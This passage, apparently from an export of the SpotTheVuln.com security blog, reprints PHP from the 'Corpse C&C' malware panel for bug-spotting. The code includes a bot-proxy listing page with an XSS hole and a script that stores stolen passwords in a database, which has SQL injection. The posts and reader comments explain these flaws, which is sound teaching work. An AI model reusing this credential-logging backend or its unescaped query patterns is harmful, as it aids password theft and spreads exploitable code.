		<option value=OH>OH<option value=OK>OK<option value=OR>OR<option value=PA>PA<option value=PR>PR<option value=RI>RI<option value=SC>SC<option value=SD>SD<option value=TN>TN<option value=TX>TX
		<option value=UT>UT<option value=VA>VA<option value=VI>VI<option value=VT>VT<option value=WA>WA<option value=WI>WI<option value=WV>WV<option value=WY>WY</select>
		<TD><BR><input type=submit value=submit></form></table><B><CENTER><BR>Current country selected: $countrys<BR>Current state selected: $states</CENTER></B><BR>
		<table width=100% cellspacing=0><tr><td><table width=100% bgcolor=#FFFFFF cellspacing=1><tr><td align=center bgcolor=#66CF96><b>List</b></td></tr></table></td></tr>
		<tr><td><table width=100% bgcolor=#FFFFFF cellspacing=1><tr><td align=center bgcolor=#66CF96>IP</td><td align=center bgcolor=#66CF96>UPDATE</td><td align=center bgcolor=#66CF96>ID</td>
		<td align=center bgcolor=#66CF96>COUNTRY</td>
		<td align=center bgcolor=#66CF96>CITY</td>
		<td align=center bgcolor=#66CF96>STATE</td>
		<td align=center bgcolor=#66CF96>UPTIME</td></tr>";
     

$stime = mktime();
$stime = $stime - 86400;
$link = mysql_connect($mysql_host, $mysql_login, $mysql_pass) or die("Could not connect: " . mysql_error());
mysql_select_db($mysql_db, $link) or die("Could not select : " . mysql_error());
$query = 'SELECT * FROM `socks` WHERE `update` > ' . $stime . ' ORDER BY `update` DESC';
$result = mysql_query($query, $link) or die("Could not execute: " . mysql_error());

$tot = 0;
while ($row = mysql_fetch_assoc($result)) {
	$prms[0] = $row['ip'];
	$prms[1] = $row['hport'];
	$prms[2] = $row['sport'];
	$prms[3] = $row['update'];
	$prms[4] = $row['uptime'];
	$prms[5] = $row['uid'];
	$prms[6] = $row['used'];
	if ($prms[0] != "") {
		printent($prms,$tot,$countrys,$states);
		$tot++;
	}
}
mysql_close($link);

print "</table><table width=100% bgcolor=#FFFFFF cellspacing=1><tr><td align=right bgcolor=#66CF96>Total: <b>$tot</b></tr></td></table></table></table></tr></td></TABLE></BODY></HTML>";

function printent($prms,$tot,$countrys,$states){
	if(!($tot%2)) {
		$bcolor="#D6D6D6";
	} else {
		$bcolor="#98E8E1";
	}
	
	$tid = $prms[5];
	$tid = chop($tid);
	
	$gi = geoip_open("../GeoIPCity.dat",GEOIP_STANDARD);
	$record = geoip_record_by_addr($gi,$prms[0]);
	geoip_close($gi);

	if (($countrys == "all") & ($states == "all")) {
		echo "<tr>\r\n";
		echo "<td align=left bgcolor=$bcolor onClick=\"window.open('check.php?ip=$prms[0]&port=$prms[2]&hport=$prms[1]','child','scrollbars=no,width=250,height=100');\" onmouseover=\"this.style.background='#000D2A';\" onmouseout=\"this.style.background='$bcolor';\"><font face='Fixedsys' color=#707070><INPUT type=button value=\"Copy IP\" onclick=window.clipboardData.setData(\"Text\",\"$prms[0]\")>$prms[0]</font></td>\r\n";
		echo "<td align=center bgcolor=$bcolor><font face='Fixedsys' color=#707070>" . date("H:i:s d.m.y", $prms[3]) ."</font></td>\r\n";//socks
		echo "<td align=center bgcolor=$bcolor><font face='Fixedsys' color=#707070><INPUT type=button value=\"Copy ID\" onclick=window.clipboardData.setData(\"Text\",\"$tid\")>&nbsp;$tid</font></td>\r\n";//socks

		// Show flag
		if ($record->country_code == "") {
			$record->country_code = "-";
			$record->country_name = "";
		}

		$c_code = strtolower($record->country_code);
		
		$flag = "<IMG src=../flags/$c_code.gif>&nbsp;$record->country_name.<BR>";
		
		echo "<td align=left bgcolor=$bcolor><font face='Fixedsys' color=#707070>$flag</font></td>\r\n";
</code>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1558</wp:post_id>
		<wp:post_date>2011-07-17 23:03:58</wp:post_date>
		<wp:post_date_gmt>2011-07-18 06:03:58</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>grammys</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="code-snippet"><![CDATA[Code Snippet]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[#secure #code #dev]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>2140</wp:comment_id>
			<wp:comment_author><![CDATA[Cross-Site Scripting (XSS), PHP, Solution Vulnerability Code Example &laquo; SpotTheVuln.com]]></wp:comment_author>
			<wp:comment_author_email></wp:comment_author_email>
			<wp:comment_author_url>http://spotthevuln.com/2011/07/grammys-cross-site-scripting/</wp:comment_author_url>
			<wp:comment_author_IP>97.74.49.242</wp:comment_author_IP>
			<wp:comment_date>2011-07-26 23:02:18</wp:comment_date>
			<wp:comment_date_gmt>2011-07-27 06:02:18</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[[...]  [...] ]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type>pingback</wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
			<wp:commentmeta>
				<wp:meta_key>akismet_result</wp:meta_key>
				<wp:meta_value><![CDATA[false]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1311746538.4556";s:7:"message";s:28:"Akismet cleared this comment";s:5:"event";s:9:"check-ham";s:4:"user";s:0:"";}]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1312182059.3548";s:7:"message";s:45:"bkrios changed the comment status to approved";s:5:"event";s:15:"status-approved";s:4:"user";s:6:"bkrios";}]]></wp:meta_value>
			</wp:commentmeta>
		</wp:comment>
	</item>
	<item>
		<title>Grammys - Cross Site Scripting</title>
		<link>http://spotthevuln.com/2011/07/grammys-cross-site-scripting/</link>
		<pubDate>Wed, 27 Jul 2011 05:59:16 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=1561</guid>
		<description></description>
		<content:encoded><![CDATA[<h1>Details</h1>
Affected Software: Corpse C&C

Fixed in Version: ?

Issue Type: XSS

Original Code: <a href="http://spotthevuln.com/2011/07/grammys/">Found Here</a>
<h1>Details</h1>
Fairly straightforward XSS bug here.  This week’s bug can be found in the index.php file for the Corpse C&C.  Specifically, the index file located at Corpse/info/socks/index.php.  Buried deep within the print statement starting on line 30 are two unsanitized, unescaped variables ($states and $countrys).  Both $states and $countrys are taken directly from $_POST  parameters and assigned to php variables.  Those php variables are then used to build HTML markup.  Buried within a large print statement, a little difficult to spot, but this bug is classic XSS. 

<h1>Vulnerable Code</h1>
<code lang="PHP" highlight="6,7,36">
<?php

include_once('geoipcity.inc');
include_once('../mysqllog.php');

$countrys = $_POST['countrys'];
$states = $_POST['states'];

if ($countrys == "") {
 $countrys = "all";
}
if ($states == "") {
 $states = "all";
}

$date = date("m-d");
list($month, $day) = explode('-', $date);


print "<STYLE><!-- a:link{color:#404040;text-decoration:none}  a:visited{color:#909090;text-decoration:none}  a:active{color:#000000;text-decoration:none}  a:hover{color:#000000;text-decoration:none}  input{BACKGROUND-COLOR:#66CF96;BORDER-BOTTOM:#ffffff 1px solid;BORDER-LEFT:#ffffff 1px solid;BORDER-RIGHT:#ffffff 1px solid;BORDER-TOP:#ffffff 1px solid;COLOR:#000000;FONT-FAMILY:Tahoma,sans-serif;FONT-SIZE:12px}  --></STYLE>
  <BODY bgcolor=#DDDDDD text=#505050 marginwidth=0><table align=center border=1><TD><form action=index.php method=post><B>Select by country</B><TD><select name=countrys><option value=all>All countries";

$j = 1;
while ($GEOIP_COUNTRY_CODES[$j] != "") {
 print "<option value=$GEOIP_COUNTRY_CODES[$j]>$GEOIP_COUNTRY_NAMES[$j]\r\n";
 $j++;
}

print "</SELECT><TD><BR><INPUT type=submit value=submit></FORM><TR><TD>
  <FORM action=index.php method=post><B>Select by state</B><TD><select name=states><option value=all>all<option value=AK>AK<option value=AL>AL<option value=AR>AR<option value=AS>AS<option value=AZ>AZ<option value=CA>CA<option value=CO>CO
  <option value=CT>CT<option value=DC>DC<option value=DE>DE<option value=FL>FL<option value=GA>GA<option value=HI>HI<option value=IA>IA<option value=ID>ID<option value=IL>IL<option value=IN>IN
  <option value=KS>KS<option value=KY>KY<option value=LA>LA<option value=MA>MA<option value=MD>MD<option value=ME>ME<option value=MI>MI<option value=MN>MN<option value=MO>MO<option value=MP>MP
  <option value=MS>MS<option value=MT>MT<option value=NC>NC<option value=ND>ND<option value=NE>NE<option value=NH>NH<option value=NJ>NJ<option value=NM>NM<option value=NV>NU<option value=NY>NY
  <option value=OH>OH<option value=OK>OK<option value=OR>OR<option value=PA>PA<option value=PR>PR<option value=RI>RI<option value=SC>SC<option value=SD>SD<option value=TN>TN<option value=TX>TX
  <option value=UT>UT<option value=VA>VA<option value=VI>VI<option value=VT>VT<option value=WA>WA<option value=WI>WI<option value=WV>WV<option value=WY>WY</select>
  <TD><BR><input type=submit value=submit></form></table><B><CENTER><BR>Current country selected:$countrys<BR>Current state selected:$states</CENTER></B><BR>
  <table width=100% cellspacing=0><tr><td><table width=100% bgcolor=#FFFFFF cellspacing=1><tr><td align=center bgcolor=#66CF96><b>List</b></td></tr></table></td></tr>
  <tr><td><table width=100% bgcolor=#FFFFFF cellspacing=1><tr><td align=center bgcolor=#66CF96>IP</td><td align=center bgcolor=#66CF96>UPDATE</td><td align=center bgcolor=#66CF96>ID</td>
  <td align=center bgcolor=#66CF96>COUNTRY</td>
  <td align=center bgcolor=#66CF96>CITY</td>
  <td align=center bgcolor=#66CF96>STATE</td>
  <td align=center bgcolor=#66CF96>UPTIME</td></tr>";
   

$stime = mktime();
$stime = $stime - 86400;
$link = mysql_connect($mysql_host, $mysql_login, $mysql_pass) or die("Could not connect:" . mysql_error());
mysql_select_db($mysql_db, $link) or die("Could not select:" . mysql_error());
$query = 'SELECT * FROM `socks` WHERE `update` >' . $stime . ' ORDER BY `update` DESC';
$result = mysql_query($query, $link) or die("Could not execute:" . mysql_error());

$tot = 0;
while ($row = mysql_fetch_assoc($result)) {
 $prms[0] = $row['ip'];
 $prms[1] = $row['hport'];
 $prms[2] = $row['sport'];
 $prms[3] = $row['update'];
 $prms[4] = $row['uptime'];
 $prms[5] = $row['uid'];
 $prms[6] = $row['used'];
 if ($prms[0] != "") {
  printent($prms,$tot,$countrys,$states);
  $tot++;
 }
}
mysql_close($link);

print "</table><table width=100% bgcolor=#FFFFFF cellspacing=1><tr><td align=right bgcolor=#66CF96>Total:<b>$tot</b></tr></td></table></table></table></tr></td></TABLE></BODY></HTML>";

function printent($prms,$tot,$countrys,$states){
 if(!($tot%2)) {
  $bcolor="#D6D6D6";
 } else {
  $bcolor="#98E8E1";
 }
 
 $tid = $prms[5];
 $tid = chop($tid);
 
 $gi = geoip_open("../GeoIPCity.dat",GEOIP_STANDARD);
 $record = geoip_record_by_addr($gi,$prms[0]);
 geoip_close($gi);

 if (($countrys == "all") & ($states == "all")) {
  echo "<tr>\r\n";
  echo "<td align=left bgcolor=$bcolor onClick=\"window.open('check.php?ip=$prms[0]&port=$prms[2]&hport=$prms[1]','child','scrollbars=no,width=250,height=100');\" onmouseover=\"this.style.background='#000D2A';\" onmouseout=\"this.style.background='$bcolor';\"><font face='Fixedsys' color=#707070><INPUT type=button value=\"Copy IP\" onclick=window.clipboardData.setData(\"Text\",\"$prms[0]\")>$prms[0]</font></td>\r\n";
  echo "<td align=center bgcolor=$bcolor><font face='Fixedsys' color=#707070>" . date("H:i:s d.m.y", $prms[3]) ."</font></td>\r\n";//socks
  echo "<td align=center bgcolor=$bcolor><font face='Fixedsys' color=#707070><INPUT type=button value=\"Copy ID\" onclick=window.clipboardData.setData(\"Text\",\"$tid\")>&nbsp;$tid</font></td>\r\n";//socks

  // Show flag
  if ($record->country_code == "") {
   $record->country_code = "-";
   $record->country_name = "";
  }

  $c_code = strtolower($record->country_code);
  
  $flag = "<IMG src=../flags/$c_code.gif>&nbsp;$record->country_name.<BR>";
  
  echo "<td align=left bgcolor=$bcolor><font face='Fixedsys' color=#707070>$flag</font></td>\r\n";
</code>
]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1561</wp:post_id>
		<wp:post_date>2011-07-26 22:59:16</wp:post_date>
		<wp:post_date_gmt>2011-07-27 05:59:16</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>grammys-cross-site-scripting</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="xss"><![CDATA[Cross-Site Scripting (XSS)]]></category>
		<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<category domain="category" nicename="solution"><![CDATA[Solution]]></category>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[#secure #code #dev]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Floods</title>
		<link>http://spotthevuln.com/2011/07/floods/</link>
		<pubDate>Wed, 27 Jul 2011 06:02:26 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=1565</guid>
		<description></description>
		<content:encoded><![CDATA[<blockquote><strong>The moment we begin to fear the opinions of others and hesitate to tell the truth that is in us, and from motives of policy are silent when we should speak, the divine floods of light and life no longer flow into our souls.
Elizabeth Cady Stanton
</strong></blockquote>
<code lang="PHP">
<?php

$use_mysql = 1;

if ($use_mysql == 1) {
	require_once('./mysqllog.php');
	require_once('./geoipcity.inc');
}

$ip = getenv("REMOTE_ADDR");
$real_ip = getenv("HTTP_X_FORWARDED_FOR");

if (isset($_GET['id'])) {
	$id = $_GET['id']; 
} else {
	$id = $_POST['id'];
}

$info = $_POST['info'];
$user = $_POST['user'];

if ($use_mysql == 1) {
	//-----------------------------------
	$gi = geoip_open('./GeoIPCity.dat', GEOIP_STANDARD);
	$record = geoip_record_by_addr($gi, $ip);
	geoip_close($gi);
	//-----------------------------------
	$info = decode_string($info);
	if(@!mysql_connect($mysql_host,$mysql_login,$mysql_pass)) {echo '<p class="err"> Error. Cant connect to mysql server </p>'; }
	if(@!mysql_selectdb($mysql_db)) {echo '<p class="err"> Error. Cant connect to DB</p>'; }
	$query = 'INSERT INTO pass (add_date,id,uidlog,ip_real,ip,pass,country,city,zip)
			  VALUES (now(), "'. $id . '", "'. $user .'", "'. $real_ip . '", "'. $ip .'", "'. $info .'", "'. $record->country_name .'", "'. $record->city .'", "'. $record->postal_code .'")';
	if(@!mysql_query($query)) {echo '<p class="err"> Error. Cant execute query</p>';  }
}
else {
	$date = date("Y-m-d");
	$time=date("H:i:s");
	
	list($year, $month, $day) = explode('-', $date);
	$filename = "pass.$day.$month.txt";
	$log = "$info@@@@@$user@@@@@$id@@@@@$real_ip@@@@@$ip@@@@@$date@@@@@$time\n";
	$fh = fopen("logs/$filename", "a+");
	fputs($fh, $log);		
	fclose($fh);
}

function decode_string($string) {
    $bindata = '';
    for ($i=0;$i<strlen($string);$i+=2) {
        $bindata.=chr(hexdec(substr($string,$i,2)));
    }
    return addslashes($bindata);
}
?>
</code>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1565</wp:post_id>
		<wp:post_date>2011-07-26 23:02:26</wp:post_date>
		<wp:post_date_gmt>2011-07-27 06:02:26</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>floods</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="code-snippet"><![CDATA[Code Snippet]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[#secure #code #dev]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>2144</wp:comment_id>
			<wp:comment_author><![CDATA[Christina]]></wp:comment_author>
			<wp:comment_author_email>cmiller28b@hotmail.com</wp:comment_author_email>
			<wp:comment_author_url></wp:comment_author_url>
			<wp:comment_author_IP>209.131.212.178</wp:comment_author_IP>
			<wp:comment_date>2011-07-29 09:56:26</wp:comment_date>
			<wp:comment_date_gmt>2011-07-29 16:56:26</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[Ok ... first try here.  I'm not overly good with PHP, but I think this one is an obvious SQL injection (obvious because even I can see it!).  The coder pulls $id, $info, and $user straight from POST and GET (lines 13-20), never sanitizes, escapes, or validates any of it, and puts it straight into the query on lines 31 and 32. At least, I don't see any validation or anything.  And, as I understand it, both POST and GET can be manipulated by the attacker.

If I'm not mistaken, even if you turn off SQL by setting $use_mysql to something else, couldn't you still screw up the logs a little with some garbage? Line 41 seems to do the same as the injection, only it just puts it straight to the log file.

Did I win? :D]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type></wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1312182055.5575";s:7:"message";s:45:"bkrios changed the comment status to approved";s:5:"event";s:15:"status-approved";s:4:"user";s:6:"bkrios";}]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_result</wp:meta_key>
				<wp:meta_value><![CDATA[false]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1311958586.1626";s:7:"message";s:28:"Akismet cleared this comment";s:5:"event";s:9:"check-ham";s:4:"user";s:0:"";}]]></wp:meta_value>
			</wp:commentmeta>
		</wp:comment>
		<wp:comment>
			<wp:comment_id>2145</wp:comment_id>
			<wp:comment_author><![CDATA[PHP, Solution, SQL Injection Vulnerability Code Example &laquo; SpotTheVuln.com]]></wp:comment_author>
			<wp:comment_author_email></wp:comment_author_email>
			<wp:comment_author_url>http://spotthevuln.com/2011/08/floods-sql-injection/</wp:comment_author_url>
			<wp:comment_author_IP>97.74.49.242</wp:comment_author_IP>
			<wp:comment_date>2011-08-01 00:03:44</wp:comment_date>
			<wp:comment_date_gmt>2011-08-01 07:03:44</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[[...]  [...] ]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type>pingback</wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1312262189.5298";s:7:"message";s:45:"bkrios changed the comment status to approved";s:5:"event";s:15:"status-approved";s:4:"user";s:6:"bkrios";}]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_result</wp:meta_key>
				<wp:meta_value><![CDATA[false]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1312182224.1253";s:7:"message";s:28:"Akismet cleared this comment";s:5:"event";s:9:"check-ham";s:4:"user";s:0:"";}]]></wp:meta_value>
			</wp:commentmeta>
		</wp:comment>
	</item>
	<item>
		<title>Floods - SQL Injection</title>
		<link>http://spotthevuln.com/2011/08/floods-sql-injection/</link>
		<pubDate>Mon, 01 Aug 2011 07:03:37 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=1569</guid>
		<description></description>
		<content:encoded><![CDATA[<h1>Details</h1>
Affected Software: Corpse C&C

Fixed in Version: ?

Issue Type: SQL Injection

Original Code: <a href="http://spotthevuln.com/2011/07/floods/">Found Here</a>
<h1>Details</h1>
This week’s bug is in Corpse C&C.  SpotTheVuln reader Christina hits it right on the head,  line 32 contains a ridiculous amount of SQL injection.  Most of the parameters passed to the INSERT statement results in SQL injection.  $id, $info, and $user are all set directly from $_GET or $_POST and are used in the SQL statement without any sanitization.  Despite its name, $real_ip is also completely attacker controlled and can be used for SQL injection.  Getenv("HTTP_X_FORWARDED_FOR") doesn’t sanitize the user controlled value in any way.  For some reason, many developers assume the X-Forwarded-For header will only specify an IP address or domain name.  X-Forwarded-For can contain any characters (including angle brackets, single quotes, and double quotes). 

<h1>Vulnerable Code</h1>
<code lang="PHP" highlight="32">
<?php

$use_mysql = 1;

if ($use_mysql == 1) {
	require_once('./mysqllog.php');
	require_once('./geoipcity.inc');
}

$ip = getenv("REMOTE_ADDR");
$real_ip = getenv("HTTP_X_FORWARDED_FOR");

if (isset($_GET['id'])) {
	$id = $_GET['id']; 
} else {
	$id = $_POST['id'];
}

$info = $_POST['info'];
$user = $_POST['user'];

if ($use_mysql == 1) {
	//-----------------------------------
	$gi = geoip_open('./GeoIPCity.dat', GEOIP_STANDARD);
	$record = geoip_record_by_addr($gi, $ip);
	geoip_close($gi);
	//-----------------------------------
	$info = decode_string($info);
	if(@!mysql_connect($mysql_host,$mysql_login,$mysql_pass)) {echo '<p class="err"> Error. Cant connect to mysql server </p>'; }
	if(@!mysql_selectdb($mysql_db)) {echo '<p class="err"> Error. Cant connect to DB</p>'; }
	$query = 'INSERT INTO pass (add_date,id,uidlog,ip_real,ip,pass,country,city,zip)
			  VALUES (now(), "'. $id . '", "'. $user .'", "'. $real_ip . '", "'. $ip .'", "'. $info .'", "'. $record->country_name .'", "'. $record->city .'", "'. $record->postal_code .'")';
	if(@!mysql_query($query)) {echo '<p class="err"> Error. Cant execute query</p>';  }
}
else {
	$date = date("Y-m-d");
	$time=date("H:i:s");
	
	list($year, $month, $day) = explode('-', $date);
	$filename = "pass.$day.$month.txt";
	$log = "$info@@@@@$user@@@@@$id@@@@@$real_ip@@@@@$ip@@@@@$date@@@@@$time\n";
	$fh = fopen("logs/$filename", "a+");
	fputs($fh, $log);		
	fclose($fh);
}

function decode_string($string) {
    $bindata = '';
    for ($i=0;$i<strlen($string);$i+=2) {
        $bindata.=chr(hexdec(substr($string,$i,2)));
    }
    return addslashes($bindata);
}
?>
</code>
]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1569</wp:post_id>
		<wp:post_date>2011-08-01 00:03:37</wp:post_date>
		<wp:post_date_gmt>2011-08-01 07:03:37</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>floods-sql-injection</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<category domain="category" nicename="solution"><![CDATA[Solution]]></category>
		<category domain="category" nicename="sql-injection"><![CDATA[SQL Injection]]></category>
		<wp:postmeta>
			<wp:meta_key>aktt_notify_twitter</wp:meta_key>
			<wp:meta_value><![CDATA[yes]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_aktt_hash_meta</wp:meta_key>
			<wp:meta_value><![CDATA[#secure #code #dev]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_edit_last</wp:meta_key>
			<wp:meta_value><![CDATA[2]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>aktt_tweeted</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:comment>
			<wp:comment_id>2146</wp:comment_id>
			<wp:comment_author><![CDATA[Yuliy]]></wp:comment_author>
			<wp:comment_author_email>yuliy.pisetsky@gmail.com</wp:comment_author_email>
			<wp:comment_author_url></wp:comment_author_url>
			<wp:comment_author_IP>76.102.43.28</wp:comment_author_IP>
			<wp:comment_date>2011-08-01 00:14:05</wp:comment_date>
			<wp:comment_date_gmt>2011-08-01 07:14:05</wp:comment_date_gmt>
			<wp:comment_content><![CDATA[There's also a vulnerability due to insufficient escaping and validation of data going into the log file. An attacker can easily generate arbitrary entries in the log file by embedding newlines into $_POST['info'] and $_POST['user'] ]]></wp:comment_content>
			<wp:comment_approved>1</wp:comment_approved>
			<wp:comment_type></wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
			<wp:commentmeta>
				<wp:meta_key>akismet_result</wp:meta_key>
				<wp:meta_value><![CDATA[false]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1312182845.9143";s:7:"message";s:28:"Akismet cleared this comment";s:5:"event";s:9:"check-ham";s:4:"user";s:0:"";}]]></wp:meta_value>
			</wp:commentmeta>
			<wp:commentmeta>
				<wp:meta_key>akismet_history</wp:meta_key>
				<wp:meta_value><![CDATA[a:4:{s:4:"time";s:15:"1312262185.8603";s:7:"message";s:45:"bkrios changed the comment status to approved";s:5:"event";s:15:"status-approved";s:4:"user";s:6:"bkrios";}]]></wp:meta_value>
			</wp:commentmeta>
		</wp:comment>
	</item>
	<item>
		<title>Boundaries</title>
		<link>http://spotthevuln.com/2011/08/boundaries/</link>
		<pubDate>Tue, 02 Aug 2011 05:19:33 +0000</pubDate>
		<dc:creator>bkrios</dc:creator>
		<guid isPermaLink="false">http://spotthevuln.com/?p=1572</guid>
		<description></description>
		<content:encoded><![CDATA[<blockquote><strong>I like pushing boundaries.
Lady Gaga
</strong></blockquote>
<code lang="PHP">
...snip...
     
</style>
<?php
  // We do some checking to see what we're doing
  if (isset($_POST['mode']) && $_POST['mode'] == 'add')
    {
      // Proceed with the save  
      $sql = "INSERT INTO " . WP_CALENDAR_CATEGORIES_TABLE . " SET category_name='".mysql_escape_string($_POST['category_name'])."', category_colour='".mysql_escape_string($_POST['category_colour'])."'";
      $wpdb->get_results($sql);
      echo "<div class=\"updated\"><p><strong>".__('Category added successfully','calendar')."</strong></p></div>";
    }
  else if (isset($_GET['mode']) && isset($_GET['category_id']) && $_GET['mode'] == 'delete')
    {
      $sql = "DELETE FROM " . WP_CALENDAR_CATEGORIES_TABLE . " WHERE category_id=".mysql_escape_string($_GET['category_id']);
      $wpdb->get_results($sql);
      $sql = "UPDATE " . WP_CALENDAR_TABLE . " SET event_category=1 WHERE event_category=".mysql_escape_string($_GET['category_id']);
      $wpdb->get_results($sql);
      echo "<div class=\"updated\"><p><strong>".__('Category deleted successfully','calendar')."</strong></p></div>";
    }
  else if (isset($_GET['mode']) && isset($_GET['category_id']) && $_GET['mode'] == 'edit' && !isset($_POST['mode']))
    {
      $sql = "SELECT * FROM " . WP_CALENDAR_CATEGORIES_TABLE . " WHERE category_id=".mysql_escape_string($_GET['category_id']);
      $cur_cat = $wpdb->get_row($sql);
      ?>
<div class="wrap">
   <h2><?php _e('Edit Category','calendar'); ?></h2>
    <form name="catform" id="catform" class="wrap" method="post" action="<?php echo bloginfo('wpurl'); ?>/wp-admin/admin.php?page=calendar-categories">
                <input type="hidden" name="mode" value="edit" />
                <input type="hidden" name="category_id" value="<?php echo stripslashes($cur_cat->category_id) ?>" />
                <div id="linkadvanceddiv" class="postbox">
                        <div style="float: left; width: 98%; clear: both;" class="inside">
				<table cellpadding="5" cellspacing="5">
                                <tr>
